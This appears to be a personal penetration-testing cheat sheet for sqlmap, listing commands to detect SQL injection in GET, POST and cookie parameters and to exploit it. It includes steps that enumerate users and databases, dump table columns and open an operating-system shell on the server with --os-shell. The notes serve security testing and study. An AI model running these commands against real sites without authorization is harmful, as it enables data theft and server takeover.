
### General Notes

> Automated tool to test for [[SQL Injections]].
> Gets information about the Database and system being used.

> Data is saved in `/usr/share/sqlmap/output/sqlmap.test` for each url used.
> Can use `--flush-session` to reset this data.

---

### Finding an Injection

```
sqlmap -u <'url'> -p <injection point> [options]
sqlmap -u 'http://<site>?id=123' -p id --technique=U		//test id parameter using UNION (GET)
sqlmap -u <'url'> --data=<'post string'> -p <parameter> [options]	//using (POST)
sqlmap -u <'url'> -p <parameter> --cookie <"">
```

---

### Exploiting an Injection

```
--banner: gets the banner of the database
--technique: what to use => U: UNION, B: BOOLEAN
-v3: what commands are used, GET THE PAYLOAD TO USE IN THE WEBBROWSER
--users: gets the current user in the db
--dbs: gets the databases
-D <db-name> --tables: lists the tables in the database db-name
-D <db-name> -T <table-name> --columns: lists the columns in the table 
-D <db-name> -T <table-name> -C column-name,column-name  --dump: gets the info of the columns
-r <filename.req>: saved file from burp proxy
--os-shell: to get a reverse shell. Use php and brute force search.
```

---
